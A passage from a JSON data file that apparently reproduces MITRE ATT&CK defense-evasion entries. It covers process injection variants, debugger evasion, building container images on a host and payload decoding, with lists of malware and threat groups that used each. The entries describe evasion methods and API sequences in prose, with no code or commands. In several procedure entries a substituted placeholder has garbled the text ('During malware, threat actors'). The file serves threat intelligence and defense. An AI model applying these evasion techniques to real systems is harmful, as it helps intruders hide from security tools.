                "description": "Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. Proc memory injection involves enumerating the memory of a process via the /proc filesystem (/proc/[pid]) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes\u2019 stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes\u2019 memory map within /proc/[pid]/maps can be overwritten using dd.[1][2][3] Other techniques such as Dynamic Linker Hijacking may be used to populate a target process with more available gadgets. Similar to Process Hollowing, proc memory injection may target child processes (such as a backgrounded copy of sleep).[2] Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process.",
                "Procedure": {}
            },
            "011": {
                "name": "Extra Window Memory Injection",
                "href": "/techniques/T1055/011",
                "description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).[1] Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. [2] [3]Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread.[4] More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  [5] [6]Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.",
                "Procedure": {
                    "S0091": {
                        "ID": "S0091",
                        "Name": "Epic",
                        "Description": "<name> has overwritten the function pointer in the extra window memory of Explorer's Shell_TrayWnd in order to execute malicious code in the context of the explorer.exe process.[7]"
                    },
                    "S0177": {
                        "ID": "S0177",
                        "Name": "Power Loader",
                        "Description": "<name> overwrites Explorer\u2019s Shell_TrayWnd extra window memory to redirect execution to a NTDLL function that is abused to assemble and execute a return-oriented programming (ROP) chain and create a malicious thread within Explorer.exe.[5][6]"
                    }
                }
            },
            "012": {
                "name": "Process Hollowing",
                "href": "/techniques/T1055/012",
                "description": "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as CreateProcess, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as ZwUnmapViewOfSection or NtUnmapViewOfSection  before being written to, realigned to the injected code, and resumed via VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.[1][2]This is very similar to Thread Local Storage but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.",
                "Procedure": {
                    "S0331": {
                        "ID": "S0331",
                        "Name": "Agent Tesla",
                        "Description": "<name> has used process hollowing to create and manipulate processes through sections of unmapped memory by reallocating that space with its malicious code.[3]"
                    },
                    "S0373": {
                        "ID": "S0373",
                        "Name": "Astaroth",
                        "Description": "<name> can create a new process in a suspended state from a targeted legitimate process in order to unmap its memory and replace it with malicious code.[4][5]"
                    },
                    "S0344": {
                        "ID": "S0344",
                        "Name": "Azorult",
                        "Description": "<name> can decrypt the payload into memory, create a new suspended process of itself, then inject a decrypted payload to the new process and resume new process execution.[6]"
                    },
                    "S0128": {
                        "ID": "S0128",
                        "Name": "BADNEWS",
                        "Description": "<name> has a command to download an .exe and use process hollowing to inject it into a new process.[7][8]"
                    },
                    "S0234": {
                        "ID": "S0234",
                        "Name": "Bandook",
                        "Description": "<name> has been launched by starting iexplore.exe and replacing it with <name>'s payload.[9][10][11]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> can inject into a target process including Svchost, Explorer, and cmd using process hollowing.[12][13]"
                    },
                    "S0127": {
                        "ID": "S0127",
                        "Name": "BBSRAT",
                        "Description": "<name> has been seen loaded into msiexec.exe through process hollowing to hide its execution.[14]"
                    },
                    "S0660": {
                        "ID": "S0660",
                        "Name": "Clambling",
                        "Description": "<name> can execute binaries through process hollowing.[15]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can use process hollowing for execution.[16][17]"
                    },
                    "S1111": {
                        "ID": "S1111",
                        "Name": "DarkGate",
                        "Description": "<name> leverages process hollowing techniques to evade detection, such as decrypting the content of an encrypted PE file and injecting it into the process vbc.exe.[18]"
                    },
                    "S0354": {
                        "ID": "S0354",
                        "Name": "Denis",
                        "Description": "<name> performed process hollowing through the API calls CreateRemoteThread, ResumeThread, and Wow64SetThreadContext.[19]"
                    },
                    "S0567": {
                        "ID": "S0567",
                        "Name": "Dtrack",
                        "Description": "<name> has used process hollowing shellcode to target a predefined list of processes from %SYSTEM32%.[20]"
                    },
                    "S0038": {
                        "ID": "S0038",
                        "Name": "Duqu",
                        "Description": "<name> is capable of loading executable code via process hollowing.[21]"
                    },
                    "G0078": {
                        "ID": "G0078",
                        "Name": "Gorgon Group",
                        "Description": "<name> malware can use process hollowing to inject one of its trojans into another process.[22]"
                    },
                    "S0189": {
                        "ID": "S0189",
                        "Name": "ISMInjector",
                        "Description": "<name> hollows out a newly created process RegASM.exe and injects its payload into the hollowed process.[23]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used a file injector DLL to spawn a benign process on the victim's system and inject the malicious payload into it via process hollowing.[24]"
                    },
                    "S0447": {
                        "ID": "S0447",
                        "Name": "Lokibot",
                        "Description": "<name> has used process hollowing to inject itself into legitimate Windows process.[25][26]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has used process hollowing in iexplore.exe to load the RedLeaves implant.[27]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "The <name> payload has been injected into benign Microsoft executables via process hollowing.[28][29]"
                    },
                    "S0229": {
                        "ID": "S0229",
                        "Name": "Orz",
                        "Description": "Some <name> versions have an embedded DLL known as MockDll that uses process hollowing and Regsvr32 to execute another payload.[30]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "A <name> payload uses process hollowing to hide the UAC bypass vulnerability exploitation inside svchost.exe.[31]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> can use process hollowing to execute its main payload.[32]"
                    },
                    "S0662": {
                        "ID": "S0662",
                        "Name": "RCSession",
                        "Description": "<name> can launch itself from a hollowed svchost.exe process.[33][15][34]"
                    },
                    "S1018": {
                        "ID": "S1018",
                        "Name": "Saint Bot",
                        "Description": "The <name> loader has used API calls to spawn MSBuild.exe in a suspended state before injecting the decrypted <name> binary into it.[35]"
                    },
                    "S0226": {
                        "ID": "S0226",
                        "Name": "Smoke Loader",
                        "Description": "<name> spawns a new copy of c:\\windows\\syswow64\\explorer.exe and then replaces the executable code in memory with malware.[36][37]"
                    },
                    "S1086": {
                        "ID": "S1086",
                        "Name": "Snip3",
                        "Description": "<name> can use RunPE to execute malicious payloads within a hollowed Windows process.[38][39]"
                    },
                    "G1018": {
                        "ID": "G1018",
                        "Name": "TA2541",
                        "Description": "<name> has used process hollowing to execute CyberGate malware.[40]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "A <name> tool can spawn svchost.exe and inject the payload into that process.[41][42]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> injects into the svchost.exe process.[43][44][45][46]"
                    },
                    "S0386": {
                        "ID": "S0386",
                        "Name": "Ursnif",
                        "Description": "<name> has used process hollowing to inject into child processes.[47]"
                    },
                    "S0689": {
                        "ID": "S0689",
                        "Name": "WhisperGate",
                        "Description": "<name> has the ability to inject its fourth stage into a suspended process created by the legitimate Windows utility InstallUtil.exe.[48][49]"
                    },
                    "S1065": {
                        "ID": "S1065",
                        "Name": "Woody RAT",
                        "Description": "<name> can create a suspended notepad process and write shellcode to delete a file into the suspended process using NtWriteVirtualMemory.[50]"
                    }
                }
            },
            "013": {
                "name": "Process Doppelg\u00e4nging",
                "href": "/techniques/T1055/013",
                "description": "Adversaries may inject malicious code into process via process doppelg\u00e4nging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelg\u00e4nging is a method of executing arbitrary code in the address space of a separate live process. Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. [1] To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. [2] To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. [3]Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. [4]Adversaries may abuse TxF to a perform a file-less variation of Process Injection. Similar to Process Hollowing, process doppelg\u00e4nging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelg\u00e4nging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext. [4]Process Doppelg\u00e4nging is implemented in 4 steps [4]:Transact \u2013 Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.Load \u2013 Create a shared section of memory and load the malicious executable.Rollback \u2013 Undo changes to original executable, effectively removing malicious code from the file system.Animate \u2013 Create a process from the tainted section of memory and initiate execution.This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelg\u00e4nging may evade detection from security products since the execution is masked under a legitimate process.",
                "Procedure": {
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> can inject into a target process using process doppelg\u00e4nging.[5][6]"
                    },
                    "G0077": {
                        "ID": "G0077",
                        "Name": "Leafminer",
                        "Description": "<name> has used Process Doppelg\u00e4nging to evade security software while deploying tools on compromised systems.[7]"
                    },
                    "S0242": {
                        "ID": "S0242",
                        "Name": "SynAck",
                        "Description": "<name> abuses NTFS transactions to launch and conceal malicious processes.[8][9]"
                    }
                }
            },
            "014": {
                "name": "VDSO Hijacking",
                "href": "/techniques/T1055/014",
                "description": "Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. VDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via Ptrace System Calls. However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).[1][2][3][4]Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.",
                "Procedure": {}
            },
            "015": {
                "name": "ListPlanting",
                "href": "/techniques/T1055/015",
                "description": "Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process. Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.List-view controls are user interface windows used to display collections of items.[1] Information about an application's list-view settings are stored within the process' memory in a SysListView32 control.ListPlanting (a form of message-passing \"shatter attack\") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items.[2] Adversaries must first copy code into the target process\u2019 memory space, which can be performed various ways including by directly obtaining a handle to the SysListView32 child of the victim process window (via Windows API calls such as FindWindow and/or EnumWindows) or other Process Injection methods.Some variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored WriteProcessMemory function. For example, an adversary can use the PostMessage and/or SendMessage API functions to send LVM_SETITEMPOSITION and LVM_GETITEMPOSITION messages, effectively copying a payload 2 bytes at a time to the allocated memory.[3] Finally, the payload is triggered by sending the LVM_SORTITEMS message to the SysListView32 child of the process window, with the payload within the newly allocated buffer passed and executed as the ListView_SortItems callback.",
                "Procedure": {
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> has used ListPlanting to inject code into a trusted process.[3]"
                    }
                }
            }
        },
        "tactic": "Defense Evasion",
        "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",
        "Procedure": {
            "C0028": {
                "ID": "C0028",
                "Name": "2015 Ukraine Electric Power Attack",
                "Description": "During the malware, Sandworm Team loaded BlackEnergy into svchost.exe, which then launched iexplore.exe for their C2. [1]"
            },
            "S0469": {
                "ID": "S0469",
                "Name": "ABK",
                "Description": "malware has the ability to inject shellcode into svchost.exe.[2]"
            },
            "S0331": {
                "ID": "S0331",
                "Name": "Agent Tesla",
                "Description": "malware can inject into known, vulnerable binaries on targeted hosts.[3]"
            },
            "S1074": {
                "ID": "S1074",
                "Name": "ANDROMEDA",
                "Description": "malware can inject into the wuauclt.exe process to perform C2 actions.[4]"
            },
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware malware has injected a Cobalt Strike beacon into Rundll32.exe.[5]"
            },
            "G0067": {
                "ID": "G0067",
                "Name": "APT37",
                "Description": "malware injects its malware variant, ROKRAT, into the cmd.exe process.[6]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware malware TIDYELF loaded the main WINTERLOVE component by injecting it into the iexplore.exe process.[7]"
            },
            "G1023": {
                "ID": "G1023",
                "Name": "APT5",
                "Description": "malware has used the CLEANPULSE utility to insert command line strings into a targeted process to alter its functionality.[8]"
            },
            "S0438": {
                "ID": "S0438",
                "Name": "Attor",
                "Description": "malware's dispatcher can inject itself into running processes to gain higher privileges and to evade detection.[9]"
            },
            "S0347": {
                "ID": "S0347",
                "Name": "AuditCred",
                "Description": "malware can inject code from files to other running processes.[10]"
            },
            "S0473": {
                "ID": "S0473",
                "Name": "Avenger",
                "Description": "malware has the ability to inject shellcode into svchost.exe.[2]"
            },
            "S0093": {
                "ID": "S0093",
                "Name": "Backdoor.Oldrea",
                "Description": "malware injects itself into explorer.exe.[11][12]"
            },
            "S1081": {
                "ID": "S1081",
                "Name": "BADHATCH",
                "Description": "malware can inject itself into an existing explorer.exe process by using RtlCreateUserThread.[13][14]"
            },
            "S0534": {
                "ID": "S0534",
                "Name": "Bazar",
                "Description": "malware can inject code through calling VirtualAllocExNuma.[15]"
            },
            "S0470": {
                "ID": "S0470",
                "Name": "BBK",
                "Description": "malware has the ability to inject shellcode into svchost.exe.[2]"
            },
            "S1039": {
                "ID": "S1039",
                "Name": "Bumblebee",
                "Description": "malware can inject code into multiple processes on infected endpoints.[16]"
            },
            "S0348": {
                "ID": "S0348",
                "Name": "Cardinal RAT",
                "Description": "malware injects into a newly spawned process created from a native Windows executable.[17]"
            },
            "S0660": {
                "ID": "S0660",
                "Name": "Clambling",
                "Description": "malware can inject into the svchost.exe process for execution.[18]"
            },
            "S1105": {
                "ID": "S1105",
                "Name": "COATHANGER",
                "Description": "malware includes a binary labeled authd that can inject a library into a running process and then hook an existing function within that process with a new function from that library.[19]"
            },
            "G0080": {
                "ID": "G0080",
                "Name": "Cobalt Group",
                "Description": "malware has injected code into trusted processes.[20]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware can inject a variety of payloads into processes dynamically chosen by the adversary.[21][22][23]"
            },
            "S0614": {
                "ID": "S0614",
                "Name": "CostaBricks",
                "Description": "malware can inject a payload into the memory of a compromised host.[24]"
            },
            "C0029": {
                "ID": "C0029",
                "Name": "Cutting Edge",
                "Description": "During malware, threat actors used malicious SparkGateway plugins to inject shared objects into web process memory on compromised Ivanti Secure Connect VPNs to enable deployment of backdoors.[25]"
            },
            "S0695": {
                "ID": "S0695",
                "Name": "Donut",
                "Description": "malware includes a subproject malwareTest to inject shellcode into a target process.[26]"
            },
            "S0024": {
                "ID": "S0024",
                "Name": "Dyre",
                "Description": "malware has the ability to directly inject its code into the web browser process.[27]"
            },
            "S0554": {
                "ID": "S0554",
                "Name": "Egregor",
                "Description": "malware can inject its payload into iexplore.exe process.[28]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware contains multiple modules for injecting into processes, such as Invoke-PSInject.[29]"
            },
            "S0168": {
                "ID": "S0168",
                "Name": "Gazer",
                "Description": "malware injects its communication module into an Internet accessible process through which it performs C2.[30][31]"
            },
            "S0032": {
                "ID": "S0032",
                "Name": "gh0st RAT",
                "Description": "malware can inject malicious code into process created by the \"Command_Create&Inject\" function.[32]"
            },
            "S0561": {
                "ID": "S0561",
                "Name": "GuLoader",
                "Description": "malware has the ability to inject shellcode into a donor processes that is started in a suspended state. malware has previously used RegAsm as a donor process.[33]"
            },
            "S0376": {
                "ID": "S0376",
                "Name": "HOPLIGHT",
                "Description": "malware has injected into running processes.[34]"
            },
            "S0040": {
                "ID": "S0040",
                "Name": "HTRAN",
                "Description": "malware can inject into into running processes.[35]"
            },
            "S0398": {
                "ID": "S0398",
                "Name": "HyperBro",
                "Description": "malware can run shellcode it injects into a newly created process.[36]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware can inject itself into another process to avoid detection including use of a technique called ListPlanting that customizes the sorting algorithm in a ListView structure.[37]"
            },
            "S0581": {
                "ID": "S0581",
                "Name": "IronNetInjector",
                "Description": "malware can use an IronPython scripts to load a .NET injector to inject a payload into its own or a remote process.[38]"
            },
            "S0044": {
                "ID": "S0044",
                "Name": "JHUHUGIT",
                "Description": "malware performs code injection injecting its own functions to browser processes.[39][40]"
            },
            "S0201": {
                "ID": "S0201",
                "Name": "JPIN",
                "Description": "malware can inject content into lsass.exe to load a module.[41]"
            },
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware has used Win7Elevate to inject malicious code into explorer.exe.[42]"
            },
            "S0681": {
                "ID": "S0681",
                "Name": "Lizar",
                "Description": "malware can migrate the loader into another process.[43]"
            },
            "S1059": {
                "ID": "S1059",
                "Name": "metaMain",
                "Description": "malware can inject the loader file, Speech02.db, into a process.[44]"
            },
            "S0084": {
                "ID": "S0084",
                "Name": "Mis-Type",
                "Description": "malware has been injected directly into a running process, including explorer.exe.[45]"
            },
            "S1122": {
                "ID": "S1122",
                "Name": "Mispadu",
                "Description": "malware's binary is injected into memory via WriteProcessMemory.[46][47]"
            },
            "S0247": {
                "ID": "S0247",
                "Name": "NavRAT",
                "Description": "malware copies itself into a running Internet Explorer process to evade detection.[48]"
            },
            "S0198": {
                "ID": "S0198",
                "Name": "NETWIRE",
                "Description": "malware can inject code into system processes including notepad.exe, svchost.exe, and vbc.exe.[49]"
            },
            "S1100": {
                "ID": "S1100",
                "Name": "Ninja",
                "Description": "malware has the ability to inject an agent module into a new process and arbitrary shellcode into running processes.[50][51]"
            },
            "C0013": {
                "ID": "C0013",
                "Name": "Operation Sharpshooter",
                "Description": "During malware, threat actors leveraged embedded shellcode to inject a downloader into the memory of Word.[52]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors injected code into a selected process, which in turn launches a command as a child process of the original.[53]"
            },
            "S0664": {
                "ID": "S0664",
                "Name": "Pandora",
                "Description": "malware can start and inject code into a new svchost process.[54]"
            },
            "S1050": {
                "ID": "S1050",
                "Name": "PcShare",
                "Description": "The malware payload has been injected into the logagent.exe and rdpclip.exe processes.[55]"
            },
            "G0068": {
                "ID": "G0068",
                "Name": "PLATINUM",
                "Description": "malware has used various methods of process injection including hot patching.[41]"
            },
            "S0378": {
                "ID": "S0378",
                "Name": "PoshC2",
                "Description": "malware contains multiple modules for injecting into processes, such as Invoke-PSInject.[56]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware can inject itself into processes including explore.exe, Iexplore.exe, Mobsync.exe., and wermgr.exe.[57][58][59][60][61]"
            },
            "S0332": {
                "ID": "S0332",
                "Name": "Remcos",
                "Description": "malware has a command to hide itself through injecting into another process.[62]"
            },
            "S0496": {
                "ID": "S0496",
                "Name": "REvil",
                "Description": "malware can inject itself into running processes on a compromised host.[63]"
            },
            "S0240": {
                "ID": "S0240",
                "Name": "ROKRAT",
                "Description": "malware can use VirtualAlloc, WriteProcessMemory, and then CreateRemoteThread to execute shellcode within the address space of Notepad.exe.[64]"
            },
            "S0446": {
                "ID": "S0446",
                "Name": "Ryuk",
                "Description": "malware has injected itself into remote processes to encrypt files using a combination of VirtualAlloc, WriteProcessMemory, and CreateRemoteThread.[65]"
            },
            "S0596": {
                "ID": "S0596",
                "Name": "ShadowPad",
                "Description": "malware has injected an install module into a newly created process.[66]"
            },
            "G0091": {
                "ID": "G0091",
                "Name": "Silence",
                "Description": "malware has injected a DLL library containing a Trojan into the fwmain32.exe process.[67]"
            },
            "S0692": {
                "ID": "S0692",
                "Name": "SILENTTRINITY",
                "Description": "malware can inject shellcode directly into Excel.exe or a specific process.[68]"
            },
            "S0633": {
                "ID": "S0633",
                "Name": "Sliver",
                "Description": "malware can inject code into local and remote processes.[69][70]"
            },
            "S0533": {
                "ID": "S0533",
                "Name": "SLOTHFULMEDIA",
                "Description": "malware can inject into running processes on a compromised host.[71]"
            },
            "S0226": {
                "ID": "S0226",
                "Name": "Smoke Loader",
                "Description": "malware injects into the Internet Explorer process.[72]"
            },
            "S0380": {
                "ID": "S0380",
                "Name": "StoneDrill",
                "Description": "malware has relied on injecting its payload directly into the process memory of the victim's preferred browser.[73]"
            },
            "G1018": {
                "ID": "G1018",
                "Name": "TA2541",
                "Description": "malware has injected malicious code into legitimate .NET related processes including  regsvcs.exe, msbuild.exe, and installutil.exe.[74][75]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "malware has used Nt* Native API functions to inject code into legitimate processes such as wermgr.exe.[76]"
            },
            "S0436": {
                "ID": "S0436",
                "Name": "TSCookie",
                "Description": "malware has the ability to inject code into the svchost.exe, iexplorer.exe, explorer.exe, and default browser processes.[77]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware has also used PowerSploit's Invoke-ReflectivePEInjection.ps1 to reflectively load a PowerShell payload into a random process on the victim system.[78]"
            },
            "S0670": {
                "ID": "S0670",
                "Name": "WarzoneRAT",
                "Description": "malware has the ability to inject malicious DLLs into a specific process for privilege escalation.[79]"
            },
            "S0579": {
                "ID": "S0579",
                "Name": "Waterbear",
                "Description": "malware can inject decrypted shellcode into the LanmanServer service.[80]"
            },
            "S0206": {
                "ID": "S0206",
                "Name": "Wiarp",
                "Description": "malware creates a backdoor through which remote attackers can inject files into running processes.[81]"
            },
            "S0176": {
                "ID": "S0176",
                "Name": "Wingbird",
                "Description": "malware performs multiple process injections to hijack system processes and execute malicious code.[82]"
            },
            "G0102": {
                "ID": "G0102",
                "Name": "Wizard Spider",
                "Description": "malware has used process injection to execute payloads to escalate privileges.[83]"
            },
            "S1065": {
                "ID": "S1065",
                "Name": "Woody RAT",
                "Description": "malware can inject code into a targeted process by writing to the remote memory of an infected system and then create a remote thread.[84]"
            }
        }
    },
    "T1612": {
        "ttp_name": "Build Image on Host",
        "ttp_id": "T1612",
        "href": "/techniques/T1612",
        "tactic": "Defense Evasion",
        "description": "Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote build request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.[1]An adversary may take advantage of that build API to build a custom image on the host that includes malware downloaded from their C2 server, and then they may utilize Deploy Container using that custom image.[2][3] If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it\u2019s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment.",
        "Procedure": {}
    },
    "T1622": {
        "ttp_name": "Debugger Evasion",
        "ttp_id": "T1622",
        "href": "/techniques/T1622",
        "tactic": "Defense Evasion",
        "description": "Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.[1]Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to Virtualization/Sandbox Evasion, if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.Specific checks will vary based on the target and/or adversary, but may involve Native API function calls such as IsDebuggerPresent() and  NtQueryInformationProcess(), or manually checking the BeingDebugged flag of the Process Environment Block (PEB). Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would \"swallow\" or handle the potential error).[2][3][4]Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping Native API function calls such as OutputDebugStringW().[5][6]",
        "Procedure": {
            "S1087": {
                "ID": "S1087",
                "Name": "AsyncRAT",
                "Description": "malware can use the CheckRemoteDebuggerPresent function to detect the presence of a debugger.[7]"
            },
            "S1070": {
                "ID": "S1070",
                "Name": "Black Basta",
                "Description": "The malware dropper can check system flags, CPU registers, CPU instructions, process timing, system libraries, and APIs to determine if a debugger is present.[8]"
            },
            "S1039": {
                "ID": "S1039",
                "Name": "Bumblebee",
                "Description": "malware can search for tools used in static analysis.[9]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware checks the BeingDebugged flag in the PEB structure during execution to identify if the malware is being debugged.[10]"
            },
            "S1066": {
                "ID": "S1066",
                "Name": "DarkTortilla",
                "Description": "malware can detect debuggers by using functions such as DebuggerIsAttached and DebuggerIsLogging. malware can also detect profilers by verifying the COR_ENABLE_PROFILING environment variable is present and active.[11]"
            },
            "S0694": {
                "ID": "S0694",
                "Name": "DRATzarus",
                "Description": "malware can use IsDebuggerPresent to detect whether a debugger is present on a victim.[12]"
            },
            "S1060": {
                "ID": "S1060",
                "Name": "Mafalda",
                "Description": "malware can search for debugging tools on a compromised host.[13]"
            },
            "C0022": {
                "ID": "C0022",
                "Name": "Operation Dream Job",
                "Description": "During malware, Lazarus Group used tools that used the IsDebuggerPresent call to detect debuggers.[12]"
            },
            "S0240": {
                "ID": "S0240",
                "Name": "ROKRAT",
                "Description": "malware can check for debugging tools.[14][15][16]"
            },
            "S1018": {
                "ID": "S1018",
                "Name": "Saint Bot",
                "Description": "malware has used is_debugger_present as part of its environmental checks.[17]"
            },
            "S0595": {
                "ID": "S0595",
                "Name": "ThiefQuest",
                "Description": "malware uses a function named is_debugging to perform anti-debugging logic. The function invokes sysctl checking the returned value of P_TRACED. malware also calls ptrace with the PTRACE_DENY_ATTACH flag to prevent debugging.[5]"
            }
        }
    },
    "T1140": {
        "ttp_name": "Deobfuscate/Decode Files or Information",
        "ttp_id": "T1140",
        "href": "/techniques/T1140",
        "tactic": "Defense Evasion",
        "description": "Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.One such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file.[1] Another example is using the Windows copy /b command to reassemble binary fragments into a malicious payload.[2]Sometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. [3]",
        "Procedure": {
            "S0469": {
                "ID": "S0469",
                "Name": "ABK",
                "Description": "malware has the ability to decrypt AES encrypted payloads.[4]"
            },
            "S1028": {
                "ID": "S1028",
                "Name": "Action RAT",
                "Description": "malware can use Base64 to decode actor-controlled C2 server communications.[5]"
            },
            "S0331": {
                "ID": "S0331",
                "Name": "Agent Tesla",
                "Description": "malware has the ability to decrypt strings encrypted with the Rijndael symmetric encryption algorithm.[6]"
            },
            "S1025": {
                "ID": "S1025",
                "Name": "Amadey",
                "Description": "malware has decoded antivirus name strings.[7]"
            },
            "S0584": {
                "ID": "S0584",
                "Name": "AppleJeus",
                "Description": "malware has decoded files received from a C2.[8]"
            },
            "S0622": {
                "ID": "S0622",
                "Name": "AppleSeed",
                "Description": "malware can decode its payload prior to execution.[9]"
            },
            "G0073": {
                "ID": "G0073",
                "Name": "APT19",
                "Description": "An malware HTTP malware variant decrypts strings using single-byte XOR keys.[10]"
            },
            "G0007": {
